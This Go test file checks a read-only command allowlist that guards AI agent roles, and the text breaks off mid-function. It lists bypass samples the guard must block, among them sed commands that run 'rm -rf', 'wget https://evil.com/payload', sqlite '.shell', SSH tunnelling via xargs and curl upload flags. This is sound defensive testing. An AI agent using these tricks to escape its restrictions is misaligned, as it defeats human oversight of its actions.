package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// === Merged from readonly_allowlist_test.go ===

// TestReadonlyAllowlist_R4R5Bypasses ensures every agy r4/r5 bypass sample
// for strict read-only roles is denied by the allowlist (default-deny).
func TestReadonlyAllowlist_R4R5Bypasses(t *testing.T) {
	t.Setenv(auditEnvRole, "reviewer")
	t.Setenv(auditEnvReadonly, "")

	cases := []struct {
		name string
		argv []string
		code string
	}{
		// sed bypasses (r4/r5)
		{name: "sed multiline e", code: "sed -n $'1p\\ne rm -rf /tmp/x' /etc/hosts"},
		{name: "sed multiline e pig", code: "sed -n $'1p\\ne pig' /etc/hosts"},
		{name: "sed multiline s e", code: "sed -n $'1p\\ns/.*/pig/e' /etc/hosts"},
		{name: "sed charclass w", argv: []string{"sed", "/[[:alpha:]/]/w /tmp/pwn"}},
		{name: "sed charclass e", argv: []string{"sed", "/[[:alpha:]/]/e pig"}},
		{name: "sed s class w", argv: []string{"sed", "s/[/]//x/w /tmp/pwn"}},
		{name: "sed s class e", argv: []string{"sed", "s/[/]//pig/e"}},
		{name: "sed y then w", argv: []string{"sed", "y|;/|ab|;w /tmp/pwn"}},
		{name: "sed brace w", argv: []string{"sed", "{/a/p}w /tmp/pwn"}},
		{name: "sed brace e", argv: []string{"sed", "{/a/p}e pig"}},
		{name: "sed Mw", argv: []string{"sed", `/root/Mw /tmp/out`}},
		{name: "sed Iw", argv: []string{"sed", `\|root|Iw /tmp/out`}},
		{name: "sed Ie", argv: []string{"sed", "-n", `\|root|Ie pig`}},

		// wget — not allowlisted at all
		{name: "wget spider", argv: []string{"wget", "--spider", "https://x"}},
		{name: "wget -O -", argv: []string{"wget", "-O", "-", "https://x"}},
		{name: "wget after --", argv: []string{"wget", "https://evil.com/payload", "--", "--spider"}},
		{name: "wget -e", argv: []string{"wget", "--spider", "-e", "spider=off", "https://x"}},
		{name: "wget -AV", argv: []string{"wget", "-AV", "https://evil.com/x"}},

		// interpreters
		{name: "python -c write", argv: []string{"python3", "-c", "open('/tmp/x','w').write('1')"}},
		{name: "python -c harmless", argv: []string{"python3", "-c", "print(1)"}},
		{name: "node -e write", argv: []string{"node", "-e", "fs.writeFileSync('/tmp/x','1')"}},
		{name: "node -e harmless", argv: []string{"node", "-e", "console.log(1)"}},
		{name: "awk program", argv: []string{"awk", "{print $1}", "f"}},
		{name: "perl -e", argv: []string{"perl", "-e", "print 1"}},

		// sqlite URI tricks
		{name: "sqlite no readonly", argv: []string{"sqlite3", "/tmp/x.db", "select 1"}},
		{name: "sqlite uri mode forge", argv: []string{"sqlite3", "file:/tmp/pwn.db?mode=ro&mode=rwc", "select 1"}},

		// structural bans
		{name: "eval", argv: []string{"eval", "echo ok"}},
		{name: "exec", argv: []string{"exec", "ls"}},
		{name: "source", code: "source ./env.sh"},
		{name: "dot source", code: ". ./env.sh"},
		{name: "background", code: "ls &"},
		{name: "cmdsubst", code: "echo $(ls)"},
		{name: "find -exec", argv: []string{"find", ".", "-exec", "grep", "foo", "{}", "+"}},
		{name: "git -c", argv: []string{"git", "-c", "a=b", "diff"}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var got string
			if tc.code != "" {
				got = guardShellReadonly(tc.code)
			} else {
				got = guardArgvReadonly(tc.argv)
			}
			if got == "" {
				t.Fatalf("expected block, got empty (argv=%v code=%q)", tc.argv, tc.code)
			}
			if !strings.Contains(got, "not in readonly allowlist") &&
				!strings.HasPrefix(got, "> ") &&
				got != depthExceededHit {
				// Allow legacy blacklist detail OR allowlist detail.
				// Prefer allowlist, but either form is a block.
				t.Logf("blocked with non-allowlist detail %q (still ok if denied)", got)
			}
		})
	}
}

// TestReadonlyAllowlist_CommonReadsPass allows frequent genuine read ops
// drawn from audit Top commands / starter list.
func TestReadonlyAllowlist_CommonReadsPass(t *testing.T) {
	t.Setenv(auditEnvRole, "scout")
	t.Setenv(auditEnvReadonly, "")

	cases := []struct {
		name string
		argv []string
		code string
	}{
		{name: "ls", argv: []string{"ls", "-la", "/tmp"}},
		{name: "cat", argv: []string{"cat", "/etc/hosts"}},
		{name: "head", argv: []string{"head", "-n", "20", "f"}},
		{name: "tail", argv: []string{"tail", "-n", "5", "f"}},
		{name: "wc", argv: []string{"wc", "-l", "f"}},
		{name: "rg", argv: []string{"rg", "-n", "foo", "."}},
		{name: "grep", argv: []string{"grep", "-n", "foo", "f"}},
		{name: "find name", argv: []string{"find", ".", "-name", "*.go", "-print"}},
		{name: "stat", argv: []string{"stat", "f"}},
		{name: "file", argv: []string{"file", "f"}},
		{name: "du", argv: []string{"du", "-sh", "."}},
		{name: "df", argv: []string{"df", "-h"}},
		{name: "pwd", argv: []string{"pwd"}},
		{name: "echo", argv: []string{"echo", "hi"}},
		{name: "printf", argv: []string{"printf", "%s", "hi"}},
		{name: "true", argv: []string{"true"}},
		{name: "which", argv: []string{"which", "ls"}},
		{name: "date", argv: []string{"date", "-u"}},
		{name: "sort", argv: []string{"sort", "f"}},
		{name: "uniq", argv: []string{"uniq", "f"}},
		{name: "cut", argv: []string{"cut", "-d:", "-f1", "f"}},
		{name: "tr", argv: []string{"tr", "a-z", "A-Z"}},
		{name: "jq", argv: []string{"jq", ".", "f.json"}},
		{name: "diff", argv: []string{"diff", "-u", "a", "b"}},
		{name: "realpath", argv: []string{"realpath", "f"}},
		{name: "basename", argv: []string{"basename", "a/b"}},
		{name: "dirname", argv: []string{"dirname", "a/b"}},
		{name: "git status", argv: []string{"git", "status"}},
		{name: "git log", argv: []string{"git", "log", "-3"}},
		{name: "git show", argv: []string{"git", "show", "HEAD"}},
		{name: "git diff", argv: []string{"git", "diff"}},
		{name: "git branch list", argv: []string{"git", "branch", "-a"}},
		{name: "git tag list", argv: []string{"git", "tag", "-l"}},
		{name: "git -C status", argv: []string{"git", "-C", "/tmp", "status"}},
		{name: "sed -n p", argv: []string{"sed", "-n", "1,20p", "f"}},
		{name: "strings", argv: []string{"strings", "/bin/ls"}},
		{name: "ps", argv: []string{"ps", "aux"}},
		{name: "systemctl status", argv: []string{"systemctl", "status", "x"}},
		{name: "journalctl", argv: []string{"journalctl", "-u", "x", "-n", "30", "--no-pager"}},
		{name: "go version", argv: []string{"go", "version"}},
		{name: "go env", argv: []string{"go", "env"}},
		{name: "gofmt -d", argv: []string{"gofmt", "-d", "x.go"}},
		{name: "pipe", code: "ls /tmp | head -n 5"},
		{name: "and", code: "git status && git log -1"},
		{name: "devnull", code: "ls /tmp 2>/dev/null"},
		{name: "hc send", argv: []string{"hc", "send", "t42", "done"}},
		{name: "git config --get", argv: []string{"git", "config", "--get", "user.name"}},
		{name: "git remote -v", argv: []string{"git", "remote", "-v"}},
		{name: "git worktree list", argv: []string{"git", "worktree", "list"}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var got string
			if tc.code != "" {
				got = guardShellReadonly(tc.code)
			} else {
				got = guardArgvReadonly(tc.argv)
			}
			if got != "" {
				t.Fatalf("expected allow, got %q (argv=%v code=%q)", got, tc.argv, tc.code)
			}
		})
	}
}

// TestReadonlyAllowlist_VerifierUnchanged documents that verifier is outside
// the strict allowlist path (auditCallerIsStrictReadonly excludes it).
func TestReadonlyAllowlist_VerifierUnchanged(t *testing.T) {
	t.Setenv(auditEnvRole, "verifier")
	t.Setenv(auditEnvReadonly, "1")
	// verifier is readonly but not strict — allowlist must not apply.
	if auditCallerIsStrictReadonly() {
		t.Fatal("verifier must not be strict readonly")
	}
	g := currentGuardCall()
	if g.strictReadonly {
		t.Fatal("verifier guardCall must not be strictReadonly")
	}
}

// TestGuard_HcReadonlyAndSubagent registers `hc` under the host link
// topology (hc -> herdr-core): strict-readonly gets send + pure queries
// only.
func TestGuard_HcReadonlyAndSubagent(t *testing.T) {
	expect := func(t *testing.T, g guardCall, a []string, want string) {
		ra, _ := g.guardCtxRunArgv(a)
		rs, _ := g.guardCtxRunShell(strings.Join(a, " "))
		if ra != want || rs != want {
			t.Fatalf("%v want rule %q, got argv=%q shell=%q", a, want, ra, rs)
		}
	}
	allow := [][]string{{"hc", "send", "t42", "ok"}, {"hc", "--help"}, {"hc", "-h"}, {"hc", "--version"}, {"hc", "-V"}, {"hc", "send", "--help"}}
	block := [][]string{{"hc"}, {"hc", "ls"}, {"hc", "read", "t42"}, {"hc", "get", "t42"}, {"hc", "run", "--bg", "x"},
		{"hc", "exec", "t42", "x"}, {"hc", "keys", "t42", "a"}, {"hc", "kill", "t42"}, {"hc", "rm", "t42"}, {"hc", "send", "--force", "t42", "x"},
		{"hc", "send", "badaddr", "x"}, {"hc", "send", "t42", "-flag"}, {"herdr-core", "send", "t42", "ok"}}
	for _, topo := range []struct{ name, target, extraDir string }{
		{"host-hc->herdr-core", "herdr-core", ""}, // PATH=~/.local/bin: toolchain dir
	} {
		t.Run(topo.name, func(t *testing.T) {
			localBin := filepath.Join(withTestTrustedHome(t), ".local", "bin")
			writeTestExecutable(t, filepath.Join(localBin, topo.target), 0555)
			linkDir := localBin
			if topo.extraDir != "" {
				linkDir = t.TempDir()
			}
			if err := os.Symlink(filepath.Join(localBin, topo.target), filepath.Join(linkDir, "hc")); err != nil {
				t.Fatalf("symlink hc -> %s: %v", topo.target, err)
			}
			t.Setenv("PATH", linkDir+":"+localBin)
			for _, env := range [][2]string{{"reviewer", ""}, {"scout", ""}, {"oracle", ""}, {"", "1"}} {
				t.Setenv(auditEnvRole, env[0])
				t.Setenv(auditEnvReadonly, env[1])
				g := currentGuardCall()
				if !g.strictReadonly {
					t.Fatalf("env %v must classify as strict readonly", env)
				}
				for _, a := range allow {
					expect(t, g, a, "")
				}
				for _, a := range block {
					ra, _ := g.guardCtxRunArgv(a)
					if rs, _ := g.guardCtxRunShell(strings.Join(a, " ")); ra == "" || rs == "" {
						t.Fatalf("%v must block under strict readonly", a)
					}
				}
			}
		})
	}
	t.Run("worker-herdr-core", func(t *testing.T) {
		t.Setenv("PATH", t.TempDir())
		t.Setenv(auditEnvRole, "worker")
		t.Setenv(auditEnvReadonly, "")
		g := currentGuardCall()
		if !g.subagent || g.strictReadonly {
			t.Fatal("worker must be a non-strict sub-agent")
		}
		for _, c := range []struct {
			a    []string
			want string
		}{{[]string{"herdr-core", "run", "x"}, ruleSubagentNestedAgent},
			{[]string{"herdr-core", "send", "--force", "t42", "x"}, ruleSubagentNestedAgent},
			{[]string{"herdr-core", "send", "t42", "x"}, ""}, {[]string{"hc", "send", "t42", "x"}, ""}} {
			expect(t, g, c.a, c.want)
		}
	})
}

// TestGuard_SSHPathAliasRegressions restores the SSH/PATH regressions
// formerly living inside the deleted sandbox-wrapper peel test: a
// trusted-dir PATH alias ssx -> /usr/bin/ssh must still reach the ssh
// head under xargs/find code-slot screens and piped-stdin tunnel
// checks. Fixture plants ONLY ssx -> /usr/bin/ssh — no sandbox-wrapper
// stand-in and no sandbox env-key logic.
func TestGuard_SSHPathAliasRegressions(t *testing.T) {
	localBin := mustSSXBin(t)
	t.Setenv(auditEnvRole, "worker")
	t.Setenv(auditEnvReadonly, "")
	t.Setenv("PATH", t.TempDir())
	g := currentGuardCall()
	if !g.subagent || g.strictReadonly {
		t.Fatal("worker must be a non-strict sub-agent")
	}
	for _, tc := range []struct{ code, want string }{ // "" = allowed
		{"echo x | PATH=" + localBin + " xargs ssx dmit sh", "piped stdin to ssh"},
		{"PATH=" + localBin + " xargs ssx dmit sh -c", "dynamic code payload"},
		{"PATH=" + localBin + " find . -exec ssx dmit sh -c {} ;", "find -exec dynamic code payload"},
	} {
		r, d := g.guardCtxRunShell(tc.code)
		checked := !strings.Contains(tc.code, "|") && !strings.HasPrefix(tc.code, "PATH=") && !strings.Contains(tc.code, "$(")
		ra, da := "", ""
		if checked {
			ra, da = g.guardCtxRunArgv(strings.Fields(tc.code))
		}
		ok := tc.want == "" && r == "" && ra == "" || tc.want != "" && d == tc.want && (!checked || ra != "" && da == tc.want)
		if !ok {
			t.Errorf("%q want %q, got shell=%s/%q argv=%s/%q", tc.code, tc.want, r, d, ra, da)
		}
	}
	checkSSHStdinTunnel(t, localBin)
}

// checkSSHStdinTunnel covers S-R4-1/S-R4-2: the ctx_run stdin tunnel
// probe and stdin-head classification must seed PATH resolution with
// the CALLER's process PATH, never the merged envAs replayed over "" —
// a remote `PATH=` op leaking into the base drops ssx -> ssh
// resolution (strict upgrade lost) and a `PATH=$PATH:<dir>` prefix
// collapses to `:<dir>` (alias unresolvable, stdin screen bypassed).
func checkSSHStdinTunnel(t *testing.T, localBin string) {
	t.Helper()
	t.Setenv("PATH", localBin)
	t.Setenv(auditEnvRole, "verifier")
	t.Setenv(auditEnvReadonly, "1")
	vg := currentGuardCall()
	if r, _ := vg.guardCtxRunStdinForCommand("xargs ssx dmit 'PATH=/nope sh'", "rm -rf /tmp/x"); r != ruleReadonlyWrite {
		t.Fatalf("remote PATH= op leak: want %s strict upgrade, got %s", ruleReadonlyWrite, r)
	}
	t.Setenv(auditEnvReadonly, "")
	t.Setenv(auditEnvRole, "worker")
	if r, _ := currentGuardCall().guardCtxRunStdinForCommand("PATH=$PATH:"+localBin+" xargs ssx dmit sh", "hc kill t1"); r != ruleSubagentNestedAgent {
		t.Fatalf("$PATH prefix collapse: want %s, got %s", ruleSubagentNestedAgent, r)
	}
}

// mustSSXBin plants the trusted-dir PATH alias ssx -> /usr/bin/ssh
// (S-R3-1) used by the SSH/PATH regression assertions.
func mustSSXBin(t *testing.T) string {
	t.Helper()
	dir := filepath.Join(withTestTrustedHome(t), ".local", "bin")
	if err := os.MkdirAll(dir, 0755); err != nil {
		t.Fatalf("mkdir %s: %v", dir, err)
	}
	// ssx points at a REAL system ssh: the R5 resolved-target shadow rule
	// only blocks targets living in user/toolchain dirs, so a toolchain
	// alias resolving into /usr/bin keeps the PATH-alias rewrite free.
	// (A local `ssx -> .local/bin/ssh` file is a planted shadow and fails
	// the new rule — that is exactly what the rule exists to catch.)
	mustSymlink(t, "/usr/bin/ssh", filepath.Join(dir, "ssx"))
	return dir
}

func mustSymlink(t *testing.T, target, link string) {
	t.Helper()
	if err := os.Symlink(target, link); err != nil {
		t.Fatal(err)
	}
}

// TestReadonlyAllowlist_Cccc pins the cccc complexity-tool policy: pure
// query spellings (--help/-h/--version/-V, single arg) and analysis runs
// that carry BOTH --no-cache and --no-config are admitted; cache/config
// writers, unknown options and every missing-guard combination fail closed.
func TestReadonlyAllowlist_Cccc(t *testing.T) {
	t.Setenv(auditEnvRole, "reviewer")
	t.Setenv(auditEnvReadonly, "")

	allow := [][]string{
		{"cccc", "--help"},
		{"cccc", "-h"},
		{"cccc", "--version"},
		{"cccc", "-V"},
		{"cccc", "--no-cache", "--no-config", "foo.go"},
		{"cccc", "--no-config", "--no-cache", "--table", "src/"},
		{"cccc", "--no-cache", "--no-config", "--pretty", "--no-ignore", "a.go"},
		{"cccc", "--no-cache", "--no-config", "--lang", "go", "a.go"},
		{"cccc", "--no-cache", "--no-config", "--exclude-lang=rs", "--ext", "go,c", "a.go"},
		{"cccc", "--no-cache", "--no-config", "--exclude", "dist/**", "--min", "3", "a.go"},
		{"cccc", "--no-cache", "--no-config", "--max-cognitive", "15", "--max-cyclomatic=10", "a.go"},
		{"cccc", "--no-cache", "--no-config", "--top-cognitive", "5", "--top-cyclomatic=5", "a.go"},
		{"cccc", "--no-cache", "--no-config", "--jobs", "2", "-j4", "a.go"},
		{"cccc", "--no-cache", "--no-config", "--", "-looks-like-flag.go"},
		{"cccc", "--no-cache", "--no-config", "--no-cache", "--no-config", "a.go"}, // duplicates
		{"cccc", "--no-cache", "--no-config", "--exclude=-foo", "a.go"},            // glued '-'-leading value stays allowed
	}
	block := [][]string{
		{"cccc"},
		{"cccc", "foo.go"},                // neither guard flag
		{"cccc", "--no-cache", "foo.go"},  // --no-config missing
		{"cccc", "--no-config", "foo.go"}, // --no-cache missing
		{"cccc", "--help", "foo.go"},      // query flag + extra args
		{"cccc", "-hV"},                   // glued query cluster
		{"cccc", "--no-cache", "--no-config", "--version"},
		{"cccc", "--no-cache", "--no-config", "--cache", "a.go"},
		{"cccc", "--no-cache", "--no-config", "--cache-file", "/tmp/x", "a.go"},
		{"cccc", "--no-cache", "--no-config", "--cache-file=/tmp/x", "a.go"},
		{"cccc", "--no-cache", "--no-config", "--config", "/tmp/c.toml", "a.go"},
		{"cccc", "--no-cache", "--no-config", "--config=/tmp/c.toml", "a.go"},
		{"cccc", "--no-cache", "--no-config", "--print-cache-file"},
		{"cccc", "--no-cache", "--no-config", "--future-opt", "a.go"},
		{"cccc", "--no-cache", "--no-config", "-x", "a.go"},
		{"cccc", "--no-cache", "--no-config", "--lang=go=extra", "--cache"},   // glued '=' value then blocked opt
		{"cccc", "--no-cache", "--no-config", "--lang", "--cache", "a.go"},    // '-'-leading separate value rejected
		{"cccc", "--no-cache", "--no-config", "-j", "--cache-file", "/tmp/x"}, // bare -j must not swallow an option
		{"cccc", "--no-cache", "--no-config", "--lang"},                       // valued option at end: missing value
		{"cccc", "--no-cache", "--no-config", "--jobs", "-"},                  // lone "-" is not a value either
	}
	for _, a := range allow {
		if hit := screenReadonlyAllowlist(a); hit != "" {
			t.Errorf("screenReadonlyAllowlist(%v) must allow, got %q", a, hit)
		}
	}
	for _, a := range block {
		if hit := screenReadonlyAllowlist(a); hit == "" {
			t.Errorf("screenReadonlyAllowlist(%v) must block", a)
		}
	}
}

// === Merged from readonly_allowlist_alfix_test.go ===

// Must Fix #1: process substitution must be blocked for strict readonly.
func TestReadonlyAllowlist_ProcessSubstBlocked(t *testing.T) {
	t.Setenv(auditEnvRole, "scout")
	t.Setenv(auditEnvReadonly, "")

	cases := []struct {
		name string
		code string
	}{
		{name: "cat process subst", code: `cat <(echo hi)`},
		{name: "diff dual process subst", code: `diff <(id) <(id)`},
		{name: "touch via process subst", code: `cat <(touch /tmp/pwn)`},
		{name: "process subst in arg position", code: `echo x <(echo hi)`},
		{name: "output process subst", code: `echo hi >(cat)`},
		{name: "bash -c with process subst", code: `bash -c 'cat <(echo hi)'`},
		{name: "bash -c argv process subst", code: ""}, // filled via argv below
	}
	for _, tc := range cases {
		if tc.code == "" {
			continue
		}
		t.Run(tc.name, func(t *testing.T) {
			got := guardShellReadonly(tc.code)
			if got == "" {
				t.Fatalf("expected block for %q, got empty", tc.code)
			}
			if !strings.Contains(got, "process substitution") && !strings.Contains(got, "bash") &&
				!strings.Contains(got, "input redirect") && !strings.Contains(got, "redirect") &&
				!strings.Contains(got, "parentheses") && !strings.Contains(got, "unknown command") &&
				!strings.Contains(got, "syntax error") && !strings.Contains(got, "shell syntax") {
				t.Fatalf("expected process substitution or syntax block, got %q", got)
			}
		})
	}
	t.Run("bash -c argv process subst", func(t *testing.T) {
		got := guardArgvReadonly([]string{"bash", "-c", "cat <(echo hi)"})
		if got == "" {
			t.Fatal("expected block")
		}
		if !strings.Contains(got, "process substitution") && !strings.Contains(got, "bash") &&
			!strings.Contains(got, "input redirect") && !strings.Contains(got, "redirect") &&
			!strings.Contains(got, "parentheses") &&
			!strings.Contains(got, "syntax error") && !strings.Contains(got, "shell syntax") {
			t.Fatalf("expected process substitution or syntax block, got %q", got)
		}
	})
}

// Must Fix #2: curl true option allowlist.
func TestReadonlyAllowlist_CurlOptionAllowlist(t *testing.T) {
	t.Setenv(auditEnvRole, "reviewer")
	t.Setenv(auditEnvReadonly, "")

	allow := []struct {
		name string
		argv []string
	}{
		{name: "curl -sS", argv: []string{"curl", "-sS", "https://example.com"}},
		{name: "curl -s -f -L", argv: []string{"curl", "-s", "-f", "-L", "https://example.com"}},
		{name: "curl -I", argv: []string{"curl", "-I", "https://example.com"}},
		{name: "curl -H", argv: []string{"curl", "-s", "-H", "Accept: application/json", "https://example.com"}},
		{name: "curl -m", argv: []string{"curl", "-s", "-m", "10", "https://example.com"}},
		{name: "curl --max-time", argv: []string{"curl", "-s", "--max-time", "10", "https://example.com"}},
		{name: "curl --connect-timeout", argv: []string{"curl", "-s", "--connect-timeout", "5", "https://example.com"}},
		{name: "curl -X GET", argv: []string{"curl", "-s", "-X", "GET", "https://example.com"}},
		{name: "curl --head", argv: []string{"curl", "--head", "https://example.com"}},
	}
	// Round-4: curl deleted from allowlist.
	for _, tc := range allow {
		t.Run("block-former-allow/"+tc.name, func(t *testing.T) {
			if got := guardArgvReadonly(tc.argv); got == "" {
				t.Fatalf("expected block for %v", tc.argv)
			}
		})
	}

	block := []struct {
		name string
		argv []string
		want string
	}{
		{name: "stderr", argv: []string{"curl", "--stderr", "/tmp/pwn", "https://x"}, want: "curl"},
		{name: "libcurl", argv: []string{"curl", "--libcurl", "/tmp/pwn.c", "https://x"}, want: "libcurl"},
		{name: "trace", argv: []string{"curl", "--trace", "/tmp/pwn", "https://x"}, want: "trace"},
		{name: "trace-ascii", argv: []string{"curl", "--trace-ascii", "/tmp/pwn", "https://x"}, want: "trace"},
		{name: "trace-time", argv: []string{"curl", "--trace-time", "https://x"}, want: "trace"},
		{name: "output-dir", argv: []string{"curl", "--output-dir", "/tmp", "-O", "https://x"}, want: "output-dir"},
		{name: "dash-o file", argv: []string{"curl", "-o", "/tmp/pwn", "https://x"}, want: "-o"},
		{name: "dash-O", argv: []string{"curl", "-O", "https://x"}, want: "-O"},
		{name: "dump-header", argv: []string{"curl", "-D", "/tmp/h", "https://x"}, want: "-D"},
		{name: "cookie-jar", argv: []string{"curl", "-c", "/tmp/cj", "https://x"}, want: "-c"},
		{name: "config", argv: []string{"curl", "-K", "/tmp/cfg", "https://x"}, want: "-K"},
		{name: "upload", argv: []string{"curl", "-T", "/tmp/f", "https://x"}, want: "-T"},
		{name: "data", argv: []string{"curl", "-d", "a=1", "https://x"}, want: "-d"},
		{name: "data-raw", argv: []string{"curl", "--data-raw", "a=1", "https://x"}, want: "data"},
		{name: "form", argv: []string{"curl", "-F", "f=@x", "https://x"}, want: "-F"},
		{name: "unknown long", argv: []string{"curl", "--proxy", "http://x", "https://x"}, want: "unknown"},
		{name: "at-file arg", argv: []string{"curl", "-s", "@/tmp/evil", "https://x"}, want: "@"},
		{name: "X POST", argv: []string{"curl", "-X", "POST", "https://x"}, want: "method"},
	}
	for _, tc := range block {
		t.Run("block/"+tc.name, func(t *testing.T) {
			got := guardArgvReadonly(tc.argv)
			if got == "" {
				t.Fatalf("expected block for %v", tc.argv)
			}
		})
	}
}

// Round-4: sqlite3 removed from allowlist.
func TestReadonlyAllowlist_SqliteStrict(t *testing.T) {
	t.Setenv(auditEnvRole, "scout")
	t.Setenv(auditEnvReadonly, "")

	t.Run("block with sql", func(t *testing.T) {
		got := guardArgvReadonly([]string{"sqlite3", "-readonly", "-safe", "/tmp/x.db", "SELECT 1"})
		if got == "" {
			t.Fatalf("sqlite3 must block")
		}
	})
	for _, argv := range [][]string{
		{"sqlite3", "-readonly", "-safe", "/tmp/x.db"},
		{"sqlite3", "/tmp/x.db", "SELECT 1"},
		{"sqlite3", "-readonly", "-safe", "/tmp/x.db", ".shell id"},
	} {
		if got := guardArgvReadonly(argv); got == "" {
			t.Fatalf("expected block for %v", argv)
		}
	}
	for _, code := range []string{
		`echo '.shell id' | sqlite3 -readonly -safe /tmp/x.db`,
		"sqlite3 -readonly -safe /tmp/x.db <<'EOF'\n.shell id\nEOF",
		`sqlite3 -readonly -safe /tmp/x.db <<< '.shell id'`,
	} {
		if got := guardShellReadonly(code); got == "" {
			t.Fatalf("expected block for %q", code)
		}
	}
}

func TestReadonlyAllowlist_GoFmtBlocked(t *testing.T) {
	t.Setenv(auditEnvRole, "reviewer")
	t.Setenv(auditEnvReadonly, "")

	if got := guardArgvReadonly([]string{"go", "fmt", "./..."}); got == "" {
		t.Fatal("go fmt must be blocked")
	} else if !strings.Contains(got, "go fmt") && !strings.Contains(got, "fmt") {
		t.Fatalf("expected go fmt in detail, got %q", got)
	}
	if got := guardArgvReadonly([]string{"go", "fmt", "-l", "."}); got == "" {
		t.Fatal("go fmt -l must still be blocked (go fmt implies -w)")
	}
	if got := guardArgvReadonly([]string{"gofmt", "-d", "x.go"}); got != "" {
		t.Fatalf("gofmt -d must allow, got %q", got)
	}
	if got := guardArgvReadonly([]string{"gofmt", "-l", "x.go"}); got != "" {
		t.Fatalf("gofmt -l must allow, got %q", got)
	}
	if got := guardArgvReadonly([]string{"gofmt", "-w", "x.go"}); got == "" {
		t.Fatal("gofmt -w must block")
	}
}

// Similar holes: compiler/mount/tar/gzip/unzip/git.
func TestReadonlyAllowlist_SimilarWriteHoles(t *testing.T) {
	t.Setenv(auditEnvRole, "scout")
	t.Setenv(auditEnvReadonly, "")

	block := []struct {
		name string
		argv []string
	}{
		{name: "gcc with source", argv: []string{"gcc", "-v", "main.c", "-o", "/tmp/pwn"}},
		{name: "mount -a", argv: []string{"mount", "-a"}},
		{name: "tar -I", argv: []string{"tar", "-tf", "a.tar", "-I", "/tmp/evil.sh"}},
		{name: "gzip -d write", argv: []string{"gzip", "-d", "file.gz"}},
		{name: "unzip extract", argv: []string{"unzip", "archive.zip"}},
		{name: "git branch -q create", argv: []string{"git", "branch", "-q", "newbranch"}},
		{name: "git config global set", argv: []string{"git", "config", "--global", "user.name", "foo"}},
		{name: "git stash bare", argv: []string{"git", "stash"}},
		{name: "git stash -m", argv: []string{"git", "stash", "-m", "msg"}},
	}
	for _, tc := range block {
		t.Run(tc.name, func(t *testing.T) {
			got := guardArgvReadonly(tc.argv)
			if got == "" {
				t.Fatalf("expected block for %v", tc.argv)
			}
		})
	}
	allow := []struct {
		name string
		argv []string
	}{
		{name: "mount -l", argv: []string{"mount", "-l"}},
		{name: "git branch -a", argv: []string{"git", "branch", "-a"}},
		{name: "git config --get", argv: []string{"git", "config", "--get", "user.name"}},
		{name: "git stash list", argv: []string{"git", "stash", "list"}},
	}
	for _, tc := range allow {
		t.Run("allow/"+tc.name, func(t *testing.T) {
			if got := guardArgvReadonly(tc.argv); got != "" {
				t.Fatalf("expected allow, got %q for %v", got, tc.argv)
			}
		})
	}
	for _, argv := range [][]string{
		{"gcc", "--version"},
		{"tar", "-tf", "a.tar"},
		{"gzip", "-l", "file.gz"},
		{"unzip", "-l", "a.zip"},
	} {
		if got := guardArgvReadonly(argv); got == "" {
			t.Fatalf("deleted command must block: %v", argv)
		}
	}
}

// Item 5: block messages include short alternative hints.
func TestReadonlyAllowlist_BlockHints(t *testing.T) {
	t.Setenv(auditEnvRole, "scout")
	t.Setenv(auditEnvReadonly, "")

	cases := []struct {
		name string
		argv []string
		code string
		hint string
	}{
		{name: "python -c", argv: []string{"python3", "-c", "print(1)"}, hint: "jq"},
		{name: "node -e", argv: []string{"node", "-e", "1"}, hint: "jq"},
		{name: "sqlite removed", argv: []string{"sqlite3", "/tmp/x.db", "SELECT 1"}, hint: "jq"},
		{name: "go test", argv: []string{"go", "test", "./..."}, hint: "verifier"},
		{name: "process subst", code: `cat <(echo hi)`, hint: "cat"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var got string
			if tc.code != "" {
				got = guardShellReadonly(tc.code)
			} else {
				got = guardArgvReadonly(tc.argv)
			}
			if got == "" {
				t.Fatal("expected block")
			}
			hinted := readonlyBlockWithHint(got)
			if !strings.Contains(hinted, tc.hint) {
				t.Fatalf("expected hint containing %q in %q", tc.hint, hinted)
			}
			// Error path used by MCP must also carry the hint.
			err := guardBlockedError(ruleReadonlyWrite, hinted)
			if !strings.Contains(err.Error(), tc.hint) {
				t.Fatalf("guardBlockedError missing hint: %v", err)
			}
		})
	}
}

// Item 6: MCP tool description lists readonly commands and stays in sync.
func TestReadonlyAllowlist_ToolsDescriptionSync(t *testing.T) {
	desc := readonlyToolsDescription()
	if desc == "" {
		t.Fatal("empty description")
	}
	lines := strings.Split(strings.TrimSpace(desc), "\n")
	if len(lines) > 15 {
		t.Fatalf("description too long: %d lines (want <=15)", len(lines))
	}
	// Every bare command token mentioned after the header must be allowlisted
	// (or be an intentional alias note like gofmt).
	knownExtra := map[string]bool{
		"gofmt": true, // allowlisted separately
	}
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "Readonly") || strings.HasPrefix(line, "只读") {
			continue
		}
		// Format: "group: cmd cmd cmd"
		parts := strings.SplitN(line, ":", 2)
		if len(parts) != 2 {
			continue
		}
		for _, tok := range strings.Fields(parts[1]) {
			tok = strings.Trim(tok, ",;")
			if tok == "" || tok == "/" || strings.HasPrefix(tok, "(") {
				continue
			}
			// skip prose words
			if tok == "or" || tok == "via" || tok == "use" || tok == "only" || tok == "with" {
				continue
			}
			if readonlyAllowlist[tok] == nil && !knownExtra[tok] {
				t.Fatalf("description mentions %q not in readonlyAllowlist (line %q)", tok, line)
			}
		}
	}
	full := ctxRunDescription
	if !strings.Contains(full, desc) && !strings.Contains(full, "Readonly role") && !strings.Contains(full, "只读角色") {
		t.Fatalf("ctxRunDescription must include readonly tools blurb; got %q", full)
	}
}

// Round-2 Must Fix: bare make/compiler must be denied by the allowlist itself
// (not only by the legacy fsWriteHeads fallback).
func TestReadonlyAllowlist_BareMakeCompiler(t *testing.T) {
	t.Setenv(auditEnvRole, "scout")
	t.Setenv(auditEnvReadonly, "")

	block := []struct {
		name string
		argv []string
	}{
		{name: "make bare", argv: []string{"make"}},
		{name: "gmake bare", argv: []string{"gmake"}},
		{name: "make all", argv: []string{"make", "all"}},
		{name: "make -C", argv: []string{"make", "-C", "/tmp"}},
		{name: "gcc bare", argv: []string{"gcc"}},
		{name: "g++ bare", argv: []string{"g++"}},
		{name: "cc bare", argv: []string{"cc"}},
		{name: "clang bare", argv: []string{"clang"}},
		{name: "clang++ bare", argv: []string{"clang++"}},
	}
	for _, tc := range block {
		t.Run(tc.name, func(t *testing.T) {
